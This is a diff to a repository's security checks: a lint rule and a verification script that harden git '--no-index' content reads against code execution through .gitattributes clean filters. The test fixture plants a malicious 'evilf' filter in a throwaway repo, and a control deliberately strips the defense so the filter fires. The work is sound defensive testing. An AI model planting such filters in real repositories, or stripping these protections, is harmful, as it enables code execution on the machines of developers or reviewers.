+        # dropped), so it can NOT be the clean-filter defense. The in-repo .gitattributes clean/
+        # smudge driver is disarmed instead by neutralizing the ATTRIBUTE SOURCE — a literal
+        # `--attr-source=<empty-tree>` on the line, OR the env equivalent `GIT_ATTR_SOURCE=<empty-
+        # tree>` (needed when routing through review_git, whose --no-index branch omits --attr-
+        # source). `--no-ext-diff`/`--no-textconv` are still required (valid; they disable the
+        # external-diff/textconv drivers). Must co-locate on the invoking line.
         if noindex:
-            for need in ("--no-filters", "--no-ext-diff", "--no-textconv"):
+            for need in ("--no-ext-diff", "--no-textconv"):
                 if need not in line:
                     violations.append("%s: --no-index content read MISSING %s: %s" % (loc, need, s))
+            if "--attr-source=" not in line and "GIT_ATTR_SOURCE=" not in line:
+                violations.append("%s: --no-index content read MISSING attr-source neutralization (--attr-source=<empty-tree> or GIT_ATTR_SOURCE=<empty-tree>; NOT the invalid --no-filters): %s" % (loc, s))
         # rule 2: patch/content-producing diff / show(non-blob) / log -p / blame -> --no-ext-diff --no-textconv.
         patch = (not nonpatch) and (not noindex) and (
             sub in ("diff", "blame")
@@ -8815,7 +9179,7 @@ echo "[verify] testing R9b-ENGINE-RCE (in-repo .gitattributes clean filter must 
     || { echo "[verify] R9b-ENGINE-RCE: control (no --attr-source) inert — fixture would not catch the clean-filter drift"; exit 1; }
 )
 
-echo "[verify] testing R8-safety (filter-clean RCE on the untracked-content path: in-repo .gitattributes filter + .git/config clean must NOT execute via collect-review-context.sh:1400 --no-index content read)..."
+echo "[verify] testing R8-safety (filter-clean RCE on the untracked-content path: in-repo .gitattributes filter + .git/config clean must NOT execute via the collector's --no-index content read)..."
 (
   tmp_dir="$(mktemp -d)"
   trap 'rm -rf "${tmp_dir}"' EXIT
@@ -8829,23 +9193,30 @@ echo "[verify] testing R8-safety (filter-clean RCE on the untracked-content path
       printf 'u.txt filter=evilf\n' > .gitattributes
       printf 'hello\n' > u.txt )                                    # untracked attacker file
   }
-  # HARDENED: the real collector with INCLUDE_UNTRACKED_CONTENT=1 reaches :1400 on u.txt; the added
-  # --no-filters must keep the clean filter UN-run.
+  # HARDENED: the real collector with INCLUDE_UNTRACKED_CONTENT=1 emits u.txt's content through a
+  # `git diff --no-index` that review_git's --no-index branch does NOT give --attr-source, so the
+  # caller supplies the env equivalent GIT_ATTR_SOURCE=<empty tree>. That must keep the in-repo
+  # .gitattributes clean driver UN-run (the invalid `--no-filters` of the old code only "protected"
+  # by erroring the whole diff out — which also dropped ALL content; see R8/untracked-content).
   proj="${tmp_dir}/proj"; mk_poisoned "${proj}"
   ( cd "${proj}"; OUT_DIR="${tmp_dir}/rc" INCLUDE_UNTRACKED_CONTENT=1 \
       bash "${collector}" >/dev/null 2>&1 || true )
   test ! -e "${tmp_dir}/PWNED" \
     || { echo "[verify] R8-safety: clean filter EXECUTED via --no-index untracked-content read (RCE)"; exit 1; }
-  # Positive control: strip --no-filters (the pre-fix line 1400); the SAME repo MUST fire PWNED,
-  # proving the negative is non-vacuous.
+  # ...and the content must ALSO actually appear (else the negative is vacuous like the old
+  # --no-filters exit-129 drop): u.txt's line must be inlined in the hardened run.
+  grep -q '^+hello$' "${tmp_dir}/rc/latest-review-context.md" \
+    || { echo "[verify] R8-safety: hardened run emitted NO untracked content (vacuous safety)"; exit 1; }
+  # Positive control: strip the GIT_ATTR_SOURCE disarm prefix; the SAME repo MUST fire PWNED,
+  # proving the negative above is non-vacuous.
   ctl="${tmp_dir}/collect-ctl.sh"
-  sed 's/--no-textconv --no-filters --no-index/--no-textconv --no-index/' "${collector}" > "${ctl}"
+  sed 's|GIT_ATTR_SOURCE="${_REVIEW_GIT_ATTR_NONE}" ||' "${collector}" > "${ctl}"
   proj2="${tmp_dir}/proj2"; mk_poisoned "${proj2}"
   ( cd "${proj2}"; AI_AUTO_GIT_HARDEN_SH="${repo_root}/scripts/git-harden.sh" \
       OUT_DIR="${tmp_dir}/rcctl" INCLUDE_UNTRACKED_CONTENT=1 \
       bash "${ctl}" >/dev/null 2>&1 || true )
   test -e "${tmp_dir}/PWNED" \
-    || { echo "[verify] R8-safety: control (no --no-filters) inert — fixture would not catch the drift"; exit 1; }
+    || { echo "[verify] R8-safety: control (no GIT_ATTR_SOURCE disarm) inert — fixture would not catch the drift"; exit 1; }
 )
 
 echo "[verify] testing pre-commit D2/H1 (DERIVED hook: absent verify-project.sh -> warn+ALLOW the onboarding commit; present -> gates)..."
